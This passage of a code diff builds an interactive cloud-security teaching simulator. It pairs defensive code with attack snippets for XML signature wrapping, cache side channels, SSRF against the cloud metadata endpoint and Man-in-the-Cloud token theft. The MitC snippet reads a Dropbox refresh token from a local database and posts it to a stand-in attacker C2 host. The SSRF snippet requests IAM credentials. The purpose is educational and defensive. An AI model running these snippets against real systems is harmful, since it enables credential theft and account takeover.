+    if (signedBody == null) {
+        throw new SecurityException("Signed body block element not found!");
+    }
+    
+    executeBusinessLogic(signedBody);
+}`,
+        codeAttack: `<!-- Attacker-wrapped SOAP payload structure -->
+<soapenv:Envelope>
+  <soapenv:Header>
+    <wsse:Security>
+      <!-- Original signature referencing 'Original' -->
+      <ds:Signature>
+        <ds:SignedInfo>
+          <ds:Reference URI="#Original"/>
+        </ds:SignedInfo>
+      </ds:Signature>
+    </wsse:Security>
+  </soapenv:Header>
+  <!-- Injected wrapper hiding the legitimate signed body -->
+  <wrapper:FakeWrapper>
+    <soapenv:Body wsu:Id="Original">
+      <operation>GetAccountDetails</operation>
+    </soapenv:Body>
+  </wrapper:FakeWrapper>
+  <!-- Malicious executable SOAP body processed by logical selector -->
+  <soapenv:Body wsu:Id="Malicious">
+    <operation>TransferAllFunds</operation>
+    <target>AttackerAccount</target>
+  </soapenv:Body>
+</soapenv:Envelope>`
+      },
+      'cross-vm': {
+        title: 'Cross-VM Side Channel (Cache Sniffing)',
+        desc: 'Exploits shared physical hardware (L3 cache lines) in multi-tenant environments. A co-resident attacker VM fills cache lines (Prime) and measures read times (Probe) after the victim runs crypto operations, to deduce cryptographic private keys.',
+        severity: 'Critical Severity',
+        severityClass: 'critical',
+        protocol: 'Hardware: L3/LLC CPU Cache Sharing',
+        remediation: 'Implement constant-time cryptographic algorithms where control flow and memory lookups are independent of key bits. Enable Hypervisor core-pinning or Intel CAT (Cache Allocation Technology) partitioning.',
+        codeDefense: `/* Constant-time modular multiplication subtraction */
+unsigned int constant_time_select(unsigned int mask, 
+                                  unsigned int a, 
+                                  unsigned int b) {
+    // Select values without conditional branching instructions
+    return (mask & a) | (~mask & b);
+}
+
+// Accesses memory locations sequentially irrespective of key bit 0 or 1
+void constant_time_crypto_op(int key_bit) {
+    volatile int dummy = 0;
+    // Performs memory accesses on both tables to balance timing profiles
+    int val0 = crypto_lookup_table[0];
+    int val1 = crypto_lookup_table[1];
+    
+    // Constant time choice
+    int secret = constant_time_select(key_bit ? 0xFFFFFFFF : 0, val1, val0);
+    process(secret);
+}`,
+        codeAttack: `/* Conceptual Prime and Probe CPU cache loop */
+void prime_and_probe_loop() {
+    // 1. PRIME: Load data to fill target L3 cache slots
+    for (int i = 0; i < CACHE_LINES; i++) {
+        attacker_buffer[i * LINE_STRIDE] = 0xFF;
+    }
+    
+    // Context switch / Sleep to allow victim VM thread execution
+    yield_cpu_to_victim();
+    
+    // 2. PROBE: Measure timer tick latency reading cache lines
+    for (int i = 0; i < CACHE_LINES; i++) {
+        uint64_t t0 = rdtsc(); // Read Time-Stamp Counter
+        volatile int temp = attacker_buffer[i * LINE_STRIDE];
+        uint64_t dt = rdtsc() - t0;
+        
+        if (dt > CACHE_MISS_THRESHOLD) {
+            // Victim VM accessed memory mapping to this cache line!
+            record_cache_eviction(i);
+        }
+    }
+}`
+      },
+      'ssrf-imds': {
+        title: 'SSRF-to-IMDS Credential Spoofing',
+        desc: 'Exploits Server-Side Request Forgery (SSRF) vulnerabilities in web applications to query local link-local hypervisor interfaces (169.254.169.254) and retrieve highly privileged cloud IAM access keys and tokens.',
+        severity: 'Critical Severity',
+        severityClass: 'critical',
+        protocol: 'Network: HTTP/REST Link-Local API',
+        remediation: 'Enforce IMDSv2 which requires a session-oriented PUT request to retrieve a security token first. Implement strict URL query schema validation, blocklisting loopback and link-local IP footprints.',
+        codeDefense: `# AWS IMDSv2 Secure Query Script
+import requests
+
+def get_metadata_imds_v2():
+    # 1. Fetch Session Token via PUT (Prevents blind SSRF GETs)
+    token_headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
+    token_url = "http://169.254.169.254/latest/api/token"
+    
+    token_res = requests.put(token_url, headers=token_headers, timeout=2)
+    token = token_res.text
+    
+    # 2. Query endpoint using the session token header
+    headers = {"X-aws-ec2-metadata-token": token}
+    creds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/WebRole"
+    
+    creds_res = requests.get(creds_url, headers=headers, timeout=2)
+    return creds_res.json()`,
+        codeAttack: `# Standard SSRF vulnerable endpoint parameter exploit
+GET /fetch-receipt?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-profile HTTP/1.1
+Host: vulnerable-app.antigravitycloud.com
+
+# Target server makes GET request locally on behalf of remote attacker:
+# GET /latest/meta-data/iam/security-credentials/admin-profile ->
+# Response contains AccessKeyId, SecretAccessKey, and Token.`
+      },
+      'mitc': {
+        title: 'Man-in-the-Cloud (MitC) Token Hijacking',
+        desc: 'Exploits endpoint OAuth token databases. Attackers exfiltrate long-lived refresh tokens of cloud drive synchronizers (OneDrive, Dropbox) to bypass authentication mechanisms, including credentials and MFA, to silently copy corporate vaults.',
+        severity: 'High Severity',
+        severityClass: 'high',
+        protocol: 'Access Control: OAuth 2.0 / Sync',
+        remediation: 'Implement Hardware Token Binding forcing OAuth refresh tokens to authenticate only when paired with the TPM device of the authorized machine. Enforce geographic-anomaly token revocation alerts.',
+        codeDefense: `# Configuration enforcing device-bound refresh tokens (FIDO/TPM)
+{
+  "tokenPolicy": {
+    "enforceTokenBinding": true,
+    "allowedClients": ["DesktopSyncClient"],
+    "requireCompliantDevice": true,
+    "sessionControls": {
+      "sessionLifetimeMinutes": 1440,
+      "signoutOnGeographicAnomaly": true
+    }
+  }
+}`,
+        codeAttack: `# Concept script exfiltrating locally stored sync credentials
+def extract_dropbox_token():
+    # Target path containing user sync database SQLite
+    token_path = os.path.expanduser("~/AppData/Local/Dropbox/info.db")
+    
+    db = sqlite3.connect(token_path)
+    cursor = db.cursor()
+    # Read stored oauth refresh token records
+    cursor.execute("SELECT config_value FROM host_config WHERE key='refresh_token'")
+    token = cursor.fetchone()[0]
+    
+    # Exfiltrate token to remote attacker server C2
+    requests.post("http://attacker-c2.net/harvest", data={"token": token})`
+      },
+      'vm-isolation': {
+        title: 'VM Placement & Private Cloud Isolation',
+        desc: 'Demonstrates physical computing resources mapping. In a Public Cloud, multiple tenants share CPU cores and cache lines, exposing them to side-channel sniffing. A Private Cloud enforces strict hardware boundaries, isolating resources at the host hypervisor layer.',
+        severity: 'Architectural Control',
+        severityClass: 'info-badge',
+        protocol: 'Infrastructure: Hardware & Hypervisor Placement',
+        remediation: 'Enforce private host environments or isolated placement groups. Configure hypervisor schedulers to disable SMT (Hyper-Threading) and pin corporate compute cores to dedicated physical sockets.',
+        codeDefense: `# Secure Hypervisor VM Placement Scheduler
+def secure_allocate_vm(hypervisor_pool, vm_req):
+    # If VM requests Private Cloud / High Isolation
+    if vm_req.isolation_policy == "DEDICATED_HARDWARE":
+        # Find host dedicated exclusively to Corporate tenant
+        for host in hypervisor_pool.dedicated_hosts:
+            if host.has_free_capacity() and host.tenant == vm_req.tenant_id:
+                return host.assign_slots(vm_req)
+        
+        # Deploy a new dedicated physical host node
+        new_host = hypervisor_pool.provision_bare_metal(vm_req.tenant_id)
+        return new_host.assign_slots(vm_req)
+        
+    return hypervisor_pool.shared_scheduler(vm_req)`,
+        codeAttack: `# Public Cloud Placement probing (Co-residency hunting)
+def hunt_co_residency(cloud_api, victim_ip):
+    # Attacker resolves victim region and subnet
+    region, subnet = resolve_network(victim_ip)
+    
+    # Spawn multiple micro-instances rapidly inside the target subnet
+    launched_vms = []
+    for i in range(50):
+        vm = cloud_api.run_instance(subnet=subnet, size="t2.micro")
+        launched_vms.append(vm)
+        
+    # Check physical host indicators to detect socket co-residency
+    for vm in launched_vms:
+        if vm.check_l3_timing_signature() == victim_ip:
+            return vm.id # Success: Co-residency target locked!`
+      }
+    };
+
+    // ----------------------------------------------------
+    // DOM CACHING & STATE
+    // ----------------------------------------------------
+    let currentAttack = 'soap-xml';
+    let remediationActive = false;
+    let currentStep = 0;
+    
+    const sidebarBtns = document.querySelectorAll('.sim-nav-btn');
+    const simHeader = document.getElementById('sim-header');
+    const simBadge = document.getElementById('sim-badge');
+    const simProtocol = document.getElementById('sim-protocol');
+    const simTitle = document.getElementById('sim-title');
+    const simDesc = document.getElementById('sim-desc');
+    const playgroundContainer = document.getElementById('sim-playground-container');
+    const simConsole = document.getElementById('sim-console');
+    const simControls = document.getElementById('sim-controls');
+    const remediationText = document.getElementById('remediation-text');
+    const codeBlockDisplay = document.getElementById('code-block-display');
+    const btnTab1 = document.getElementById('btn-tab-1');
+    const btnTab2 = document.getElementById('btn-tab-2');
+    const threatDot = document.getElementById('threat-dot');
+    const threatStatusText = document.getElementById('threat-status-text');
+    const remediationToggle = document.getElementById('remediation-toggle');
+    const stepIndicator = document.getElementById('lab-step-indicator');
+
+    let currentCodeTab = 'defense'; // 'defense' or 'attack'
+
+    // ----------------------------------------------------
+    // INITIALIZATION
+    // ----------------------------------------------------
+    window.addEventListener('DOMContentLoaded', () => {
+      // Set body class
+      document.body.classList.add('simulator-body');
+      
+      // Sidebar event handlers
+      sidebarBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+          sidebarBtns.forEach(b => b.classList.remove('active'));
+          btn.classList.add('active');
+          loadAttack(btn.getAttribute('data-target'));
+        });
+      });
+
+      // Remediation toggle handler
+      remediationToggle.addEventListener('change', (e) => {
+        remediationActive = e.target.checked;
+        updateThreatStatus();
+        logToConsole(`System configuration updated: Remediation ${remediationActive ? 'ENABLED' : 'DISABLED'}.`, 'info');
+        resetSimulation();
+      });
+
+      // Code tabs handlers
+      btnTab1.addEventListener('click', () => setCodeTab('defense'));
+      btnTab2.addEventListener('click', () => setCodeTab('attack'));
+
+      // Load initial attack
+      loadAttack('soap-xml');
+    });
+
+    // ----------------------------------------------------
+    // ENGINE FUNCTIONS
+    // ----------------------------------------------------
+    function loadAttack(id) {
+      currentAttack = id;
+      const data = ATTACK_VECTORS[id];
+      
+      // Update header details
+      simTitle.textContent = data.title;
+      simDesc.textContent = data.desc;
+      simBadge.textContent = data.severity;
+      simBadge.className = `sim-badge ${data.severityClass}`;
+      simProtocol.textContent = data.protocol;
+      
+      // Update header side-marker styling
+      simHeader.className = `sim-header-card ${id}-active`;
+
+      // Update remediation texts
+      remediationText.textContent = data.remediation;
+
+      // Update code blocks
+      updateCodeBlock();
+
+      // Reset states
+      remediationToggle.checked = false;
+      remediationActive = false;
+      updateThreatStatus();
+
+      // Initialize playground & controls
+      initPlayground();
+      logToConsole(`--- Loaded Lab Profile: ${data.title} ---`, 'info');
+    }
+
+    function setCodeTab(tab) {
+      currentCodeTab = tab;
+      if (tab === 'defense') {
+        btnTab1.classList.add('active');
+        btnTab2.classList.remove('active');
+        btnTab1.setAttribute('aria-selected', 'true');
+        btnTab2.setAttribute('aria-selected', 'false');
+      } else {
+        btnTab2.classList.add('active');
+        btnTab1.classList.remove('active');
+        btnTab2.setAttribute('aria-selected', 'true');
+        btnTab1.setAttribute('aria-selected', 'false');
+      }
+      updateCodeBlock();
+    }
+
+    function updateCodeBlock() {
+      const data = ATTACK_VECTORS[currentAttack];
+      const code = (currentCodeTab === 'defense') ? data.codeDefense : data.codeAttack;
+      codeBlockDisplay.textContent = code;
+    }
+
+    function updateThreatStatus() {
+      if (currentAttack === 'vm-isolation') {
+        threatDot.className = 'threat-dot secure';
+        threatStatusText.textContent = 'MONITORING MODE';
+        return;
+      }
+      
+      if (remediationActive) {
+        threatDot.className = 'threat-dot secure';
+        threatStatusText.textContent = 'SECURE CONFIG';
+      } else {
+        threatDot.className = 'threat-dot vuln';
+        threatStatusText.textContent = 'SYSTEM VULNERABLE';
+      }
+    }
+
+    function logToConsole(message, type = 'info') {
+      const line = document.createElement('div');
+      line.className = `console-line ${type}`;
+      
+      const prompt = document.createElement('span');
+      prompt.className = 'prompt';
+      prompt.textContent = '>';
+      
+      const text = document.createElement('span');
+      text.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+      
+      line.appendChild(prompt);
+      line.appendChild(text);
+      simConsole.appendChild(line);
+      simConsole.scrollTop = simConsole.scrollHeight;
+    }
+
+    function resetSimulation() {
+      currentStep = 0;
+      stepIndicator.textContent = 'Step: Ready';
+      initPlayground();
+    }
+
+    // ----------------------------------------------------
+    // PLAYGROUND GENERATOR & INTERACTIVE LOGIC
+    // ----------------------------------------------------
+    function initPlayground() {
+      playgroundContainer.innerHTML = '';
+      simControls.innerHTML = '';
+
+      switch(currentAttack) {
+        case 'soap-xml':
+          renderSOAPPlayground();
+          break;
+        case 'cross-vm':
+          renderCrossVMPlayground();
+          break;
+        case 'ssrf-imds':
+          renderSSRFPlayground();
+          break;
+        case 'mitc':
+          renderMitCPlayground();
+          break;
+        case 'vm-isolation':
+          renderVMIsolationPlayground();
+          break;
+      }
+    }
+
+    // --- SOAP XML WRAPPING ---
+    function renderSOAPPlayground() {
+      playgroundContainer.innerHTML = `
+        <div class="soap-split">
+          <div class="soap-payload-box">
+            <div class="soap-title">Original Signature Engine Scope</div>
+            <div class="xml-content" id="xml-signed-view">
+&lt;soapenv:Header&gt;
+  &lt;wsse:Security&gt;
+    &lt;ds:Signature&gt;
+      &lt;ds:SignedInfo&gt;
+        &lt;ds:Reference URI="#Original"/&gt;
+      &lt;/ds:SignedInfo&gt;
+    &lt;/ds:Signature&gt;
+  &lt;/wsse:Security&gt;
+&lt;/soapenv:Header&gt;
+<span class="xml-hl-signed">&lt;soapenv:Body wsu:Id="Original"&gt;
+  &lt;operation&gt;GetAccount&lt;/operation&gt;
+&lt;/soapenv:Body&gt;</span>
+            </div>
+          </div>
+          <div class="soap-payload-box">
+            <div class="soap-title">Backend Business Logic View</div>
+            <div class="xml-content" id="xml-logic-view">
+&lt;soapenv:Envelope&gt;
+  &lt;soapenv:Header&gt;...&lt;/soapenv:Header&gt;
+  &lt;wrapper:FakeWrapper&gt;
+    &lt;soapenv:Body wsu:Id="Original"&gt;
+      &lt;operation&gt;GetAccount&lt;/operation&gt;
+    &lt;/soapenv:Body&gt;
+  &lt;/wrapper:FakeWrapper&gt;
+  <span class="xml-hl-attacker" id="malicious-body-xml" style="opacity: 0.5;">&lt;soapenv:Body wsu:Id="Malicious"&gt;
+  &lt;operation&gt;TransferAllFunds&lt;/operation&gt;
+&lt;/soapenv:Body&gt;</span>
+&lt;/soapenv:Envelope&gt;
+            </div>
+          </div>
+        </div>
+      `;
+
+      // Controls
+      simControls.innerHTML = `
+        <button type="button" class="btn btn-primary" id="soap-btn-1">1. Inject Malicious Body</button>
+        <button type="button" class="btn btn-primary" id="soap-btn-2" disabled>2. Parse & Verify</button>
+        <button type="button" class="btn btn-secondary" onclick="resetSimulation()">Reset</button>
+      `;
+
+      const btn1 = document.getElementById('soap-btn-1');
+      const btn2 = document.getElementById('soap-btn-2');
+      const malXml = document.getElementById('malicious-body-xml');
+
+      btn1.addEventListener('click', () => {
+        currentStep = 1;
+        stepIndicator.textContent = 'Step 1: Payload Injected';
+        malXml.style.opacity = '1';
+        btn1.disabled = true;
+        btn2.disabled = false;
+        logToConsole("Attacker wraps XML payload. A secondary unsigned <Body> element with ID='Malicious' is injected.", "warning");
+      });
+
+      btn2.addEventListener('click', () => {
+        currentStep = 2;
+        stepIndicator.textContent = 'Step 2: Processing Completed';
+        btn2.disabled = true;
+        
+        logToConsole("Incoming message reached XML Verification Engine...", "info");
+        setTimeout(() => {
+          logToConsole("Signature matches the element referencing ID='Original'. Signature VALID.", "success");
+          
+          setTimeout(() => {
+            logToConsole("Message forwarded to Application Business Logic module...", "info");
+            
+            setTimeout(() => {
+              if (remediationActive) {
+                logToConsole("Strict Schema Check or Absolute XPath query active.", "info");
+                logToConsole("Remediation Block: Duplicate <Body> nodes detected or XPath points directly to verified ID='Original'. XML parsing rejected!", "success");
+                logToConsole("Execution Blocked. System Secure.", "success");
+              } else {
+                logToConsole("Application queried document via getElementsByTagName('Body')[1] or loose XPath.", "warning");
+                logToConsole("ALERT: Business Logic executed the unsigned, malicious element: TransferAllFunds to AttackerAccount!", "error");
+                logToConsole("EXPLOIT SUCCESSFUL: Action Executed.", "error");
+              }
+            }, 800);
+          }, 800);
+        }, 800);
+      });
+    }
+
+    // --- CROSS-VM SIDE CHANNEL ---
+    function renderCrossVMPlayground() {
+      playgroundContainer.innerHTML = `
+        <div class="cache-container">
+          <div style="font-size: 0.9rem; font-weight: 600; color: var(--dark-text);">Shared L3 CPU Cache Lines (16 Slots)</div>
+          <div class="cache-grid" id="cache-grid-element">
+            <!-- 16 cache line items -->
+          </div>
+          <div class="cache-legend">
+            <div class="legend-item"><div class="legend-box" style="background: rgba(31, 41, 55, 0.4);"></div><span>Empty</span></div>
+            <div class="legend-item"><div class="legend-box" style="background: rgba(59, 130, 246, 0.5);"></div><span>Attacker Data</span></div>
+            <div class="legend-item"><div class="legend-box" style="background: rgba(139, 92, 246, 0.6);"></div><span>Victim Data (Evict)</span></div>
+            <div class="legend-item"><div class="legend-box" style="background: rgba(245, 158, 11, 0.6);"></div><span>Cache Miss (Slow)</span></div>
+            <div class="legend-item"><div class="legend-box" style="background: rgba(16, 185, 129, 0.6);"></div><span>Cache Hit (Fast)</span></div>
+          </div>
+        </div>
+      `;
+
+      const grid = document.getElementById('cache-grid-element');
+      for (let i = 0; i < 16; i++) {
+        const line = document.createElement('div');
+        line.className = 'cache-line';
+        line.id = `cache-l-${i}`;
+        line.textContent = `L${i}`;
+        grid.appendChild(line);
+      }
+
+      simControls.innerHTML = `
+        <button type="button" class="btn btn-primary" id="cache-btn-1">1. Prime Cache</button>
+        <button type="button" class="btn btn-primary" id="cache-btn-2" disabled>2. Victim Crypt</button>
+        <button type="button" class="btn btn-primary" id="cache-btn-3" disabled>3. Probe Cache</button>
+        <button type="button" class="btn btn-primary" id="cache-btn-4" disabled>4. Deduce Key</button>
+        <button type="button" class="btn btn-secondary" onclick="resetSimulation()">Reset</button>
+      `;
+
+      const btn1 = document.getElementById('cache-btn-1');
+      const btn2 = document.getElementById('cache-btn-2');
+      const btn3 = document.getElementById('cache-btn-3');
+      const btn4 = document.getElementById('cache-btn-4');
+
+      const victimAccessedSlots = [3, 7, 11, 14];
+
+      btn1.addEventListener('click', () => {
+        currentStep = 1;
+        stepIndicator.textContent = 'Step 1: Cache Primed';
+        btn1.disabled = true;
+        btn2.disabled = false;
+
+        // Attacker fills all cache lines
+        for (let i = 0; i < 16; i++) {
+          const slot = document.getElementById(`cache-l-${i}`);
+          // If CAT remediation is active, attacker is restricted to lines 0-7
+          if (remediationActive) {
+            if (i < 8) {
+              slot.className = 'cache-line primed';
+            }
+          } else {
+            slot.className = 'cache-line primed';
+          }
+        }
+        logToConsole("Attacker VM executes instructions filling cache lines with its own mock data.", "info");
+      });
+
+      btn2.addEventListener('click', () => {
+        currentStep = 2;
+        stepIndicator.textContent = 'Step 2: Victim Executed';
+        btn2.disabled = true;
+        btn3.disabled = false;
+
+        // Victim VM accesses memory slots, evicting attacker data
+        victimAccessedSlots.forEach(idx => {
+          const slot = document.getElementById(`cache-l-${idx}`);
+          if (remediationActive) {
+            // Intel CAT: victim is partitioned to lines 8-15, cannot evict lines 0-7
+            // Constant-time: victim accesses all lines equally, resulting in no differential information
+            slot.className = 'cache-line victim';
+          } else {
+            slot.className = 'cache-line victim';
+          }
+        });
+        logToConsole("Victim VM runs decryption algorithms concurrently. Memory requests evict specific attacker cache lines.", "warning");
+      });
+
+      btn3.addEventListener('click', () => {
+        currentStep = 3;
+        stepIndicator.textContent = 'Step 3: Probing Completed';
+        btn3.disabled = true;
+        btn4.disabled = false;
+
+        // Attacker reads back and measures latency
+        for (let i = 0; i < 16; i++) {
+          const slot = document.getElementById(`cache-l-${i}`);
+          
+          if (remediationActive) {
+            // If CAT active, lines 0-7 are untouched by victim, so they are fast Hits.
+            // If Constant-time active, victim accesses all lines uniformly.
+            if (i < 8) {
+              slot.className = 'cache-line hit';
+            } else {
+              slot.className = 'cache-line victim';
+            }
+          } else {
+            if (victimAccessedSlots.includes(i)) {
+              slot.className = 'cache-line miss';
+            } else {
+              slot.className = 'cache-line hit';
+            }
+          }
+        }
+        logToConsole("Attacker reads back its data. Memory access times computed:", "info");
+        setTimeout(() => {
+          if (remediationActive) {
+            logToConsole("Remediation active: Cache access is uniform or partitioned.", "success");
+            logToConsole("No differential cache miss timings observed. Attacker reads constant 15ns (Hit) on all slots.", "success");
+          } else {
+            logToConsole("Slots [3, 7, 11, 14] display high read latency: 85ns (Cache Miss). Other slots are 15ns (Cache Hit).", "warning");
+          }
+        }, 500);
+      });
+
+      btn4.addEventListener('click', () => {
+        currentStep = 4;
+        stepIndicator.textContent = 'Step 4: Analysis Complete';
+        btn4.disabled = true;
+
+        if (remediationActive) {
+          logToConsole("Timing Analysis Result: Uniform distribution. Unable to extract cryptographic key bits.", "success");
+          logToConsole("Exploit blocked. Cryptographic operations protected.", "success");
+        } else {
+          logToConsole("Timing Analysis: Eviction pattern decoded. Extracted secret private key bits: 1011001", "error");
+          logToConsole("EXPLOIT SUCCESSFUL: Cryptographic secrets exfiltrated.", "error");
+        }
+      });
+    }
+
+    // --- SSRF TO IMDS ---
+    function renderSSRFPlayground() {
+      playgroundContainer.innerHTML = `
+        <div class="network-container">
+          <div class="network-row">
+            <div class="net-node active" id="node-attacker">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+              <span>Attacker</span>
+            </div>
+            
+            <div class="net-node" id="node-webapp">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+              <span id="webapp-label">Web App</span>
+            </div>
+
+            <div class="net-node" id="node-imds">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/><path d="M3 12c0 1.66 4 3 9 3s9-1.34 9-3"/></svg>
+              <span>IMDS</span>
+            </div>
+          </div>
+          <div class="net-wire"></div>
+          <div class="net-wire-active" id="net-wire-1"></div>
+          <div class="net-wire-active" id="net-wire-2" style="left:50%; width:0%;"></div>
+          <div class="net-packet" id="net-pkt"></div>
+
+          <div class="ssrf-input-container">
+            <span style="font-family: var(--font-mono); font-size: 0.8rem; color: var(--dark-muted); padding-left: 0.5rem; display: flex; align-items: center;">Target URL:</span>
+            <input type="text" class="ssrf-url-input" id="ssrf-url" value="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role">
+          </div>
+        </div>
+      `;
+
+      simControls.innerHTML = `
+        <button type="button" class="btn btn-primary" id="ssrf-btn-submit">Send SSRF Request</button>
+        <button type="button" class="btn btn-secondary" onclick="resetSimulation()">Reset</button>
+      `;
+
+      const submitBtn = document.getElementById('ssrf-btn-submit');
+      const urlInput = document.getElementById('ssrf-url');
+      const nodeWebapp = document.getElementById('node-webapp');
+      const nodeImds = document.getElementById('node-imds');
+      const wire1 = document.getElementById('net-wire-1');
+      const wire2 = document.getElementById('net-wire-2');
+      const pkt = document.getElementById('net-pkt');
+
+      submitBtn.addEventListener('click', () => {
+        submitBtn.disabled = true;
+        const targetUrl = urlInput.value.trim();
+        
+        logToConsole(`Attacker launches HTTP query to web app with target URL: ${targetUrl}`, "warning");
+        
+        // Step 1: Packet goes from Attacker to Webapp
+        pkt.style.display = 'block';
+        pkt.style.left = '80px';
+        pkt.style.transition = 'left 0.8s linear';
+        nodeWebapp.className = 'net-node active';
+        wire1.style.width = '50%';
+        
+        setTimeout(() => {
+          pkt.style.left = '50%';
+          
+          setTimeout(() => {
+            // Webapp evaluates URL
+            if (remediationActive) {
+              // Blocked by local URL filter
+              logToConsole("Web App input sanitation active: Checking URL hostname...", "info");
+              setTimeout(() => {
+                logToConsole("Sanitizer Check: Request blocked. Target URL points to forbidden local IP range (169.254.169.254).", "success");
+                nodeWebapp.className = 'net-node secure';
+                wire1.className = 'net-wire-active error-wire';
+                logToConsole("Web App returns: 403 Forbidden. Exploit failed.", "success");
+                pkt.style.display = 'none';
+              }, 600);
+            } else {
+              // Vulnerable webapp proxies GET request to IMDS
+              nodeWebapp.className = 'net-node vulnerable';
+              logToConsole("Web App is vulnerable. Routing blind proxy GET request to local IMDS link-local IP...", "warning");
+              
+              wire2.style.width = '50%';
+              pkt.style.transition = 'left 0.8s linear';
+              pkt.style.left = '100%';
+              
+              setTimeout(() => {
+                nodeImds.className = 'net-node active';
+                
+                setTimeout(() => {
+                  logToConsole("Local IMDS intercepts GET request from EC2 instance.", "info");
+                  
+                  // Check if IMDSv2 is active
+                  if (remediationActive) {
+                    // This wouldn't happen if blocklisted earlier, but if IMDSv2 is checked:
+                    logToConsole("IMDSv2 policy active: Rejecting GET request without valid session token header.", "success");
+                    nodeImds.className = 'net-node secure';
+                    logToConsole("IMDS returns: 401 Unauthorized. Exploit failed.", "success");
+                    pkt.style.display = 'none';
+                  } else {
+                    logToConsole("IMDSv1 active. Credentials retrieved successfully.", "warning");
+                    
+                    // Return packet to Webapp
+                    pkt.style.left = '50%';
+                    setTimeout(() => {
+                      nodeImds.className = 'net-node';
+                      
+                      // Return packet to Attacker
+                      pkt.style.left = '80px';
+                      setTimeout(() => {
+                        pkt.style.display = 'none';
+                        logToConsole("Web App exfiltrated response content to attacker terminal:", "error");
+                        logToConsole(`{
+  "Code" : "Success",
+  "LastUpdated" : "2026-07-21T06:12:00Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token" : "IQoJb3JpZ2luX2VjEOb...",
+  "Expiration" : "2026-07-21T18:12:00Z"
+}`, "error");
+                        logToConsole("EXPLOIT SUCCESSFUL: Cloud Control credentials compromised.", "error");
+                      }, 800);
+                    }, 800);
+                  }
+                }, 600);
+              }, 800);
+            }
+          }, 600);
+        }, 800);
+      });
+    }
+
+    // --- MAN IN THE CLOUD (MitC) ---
+    function renderMitCPlayground() {
+      playgroundContainer.innerHTML = `
+        <div class="mitc-container">
+          <div class="mitc-row">
+            <div class="mitc-entity" id="mitc-victim">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:20px;height:20px;"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+              <strong>Victim PC</strong>
+              <div class="token-pill" id="victim-token">Token: Active</div>
+            </div>
+
+            <div class="mitc-entity" id="mitc-c2">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:20px;height:20px;"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+              <strong>Attacker C2</strong>
+              <div class="token-pill" id="c2-token" style="display:none;">Token: None</div>
+            </div>
+
+            <div class="mitc-entity" id="mitc-cloud">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:20px;height:20px;"><path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"/></svg>
+              <strong>Cloud Drive</strong>
+              <span style="font-size:0.65rem;color:var(--dark-muted);">Enterprise Sync</span>
+            </div>
+          </div>
+        </div>
+      `;
+
+      simControls.innerHTML = `
+        <button type="button" class="btn btn-primary" id="mitc-btn-1">1. Deploy Endpoint Malware</button>
+        <button type="button" class="btn btn-primary" id="mitc-btn-2" disabled>2. Extract & Exfiltrate Token</button>
+        <button type="button" class="btn btn-primary" id="mitc-btn-3" disabled>3. Rogue Client Sync</button>
+        <button type="button" class="btn btn-secondary" onclick="resetSimulation()">Reset</button>
+      `;
+
+      const btn1 = document.getElementById('mitc-btn-1');
+      const btn2 = document.getElementById('mitc-btn-2');
+      const btn3 = document.getElementById('mitc-btn-3');
+      const vicEnt = document.getElementById('mitc-victim');
+      const c2Ent = document.getElementById('mitc-c2');
+      const cloudEnt = document.getElementById('mitc-cloud');
+      const vicTok = document.getElementById('victim-token');
+      const c2Tok = document.getElementById('c2-token');
+
+      btn1.addEventListener('click', () => {
+        currentStep = 1;
+        stepIndicator.textContent = 'Step 1: Malware Deployed';
+        btn1.disabled = true;
+        btn2.disabled = false;
+        vicEnt.className = 'mitc-entity alert';
+        logToConsole("Attacker deploys lightweight token harvester agent on victim endpoint.", "warning");
+      });
+
+      btn2.addEventListener('click', () => {
+        currentStep = 2;
+        stepIndicator.textContent = 'Step 2: Token Exfiltrated';
+        btn2.disabled = true;
+        btn3.disabled = false;
+        
+        vicTok.className = 'token-pill compromised';
+        logToConsole("Harvester reads local sync database SQLite and extracts OAuth refresh token.", "warning");
+        
+        setTimeout(() => {
+          c2Tok.style.display = 'block';
+          c2Tok.className = 'token-pill compromised';
+          c2Tok.textContent = 'Token: Hijacked';
+          c2Ent.className = 'mitc-entity highlight';
+          logToConsole("Token successfully exfiltrated to attacker's Command & Control (C2) server.", "error");
+        }, 800);
+      });
+
+      btn3.addEventListener('click', () => {
+        currentStep = 3;
+        stepIndicator.textContent = 'Step 3: Sync Initiated';
+        btn3.disabled = true;
+
+        logToConsole("Attacker injects stolen OAuth refresh token into rogue synchronization client.", "info");
+        setTimeout(() => {
+          logToConsole("Rogue client initiates synchronization request to Enterprise Cloud Storage...", "info");
+          
+          setTimeout(() => {
+            if (remediationActive) {
+              logToConsole("TPM Token Binding enabled on Enterprise Cloud Storage.", "info");
+              logToConsole("Sync request signature validation failed: OAuth token does not match attacker client hardware TPM signature.", "success");
+              logToConsole("Connection Rejected. Exploit blocked.", "success");
+              cloudEnt.className = 'mitc-entity highlight';
+            } else {
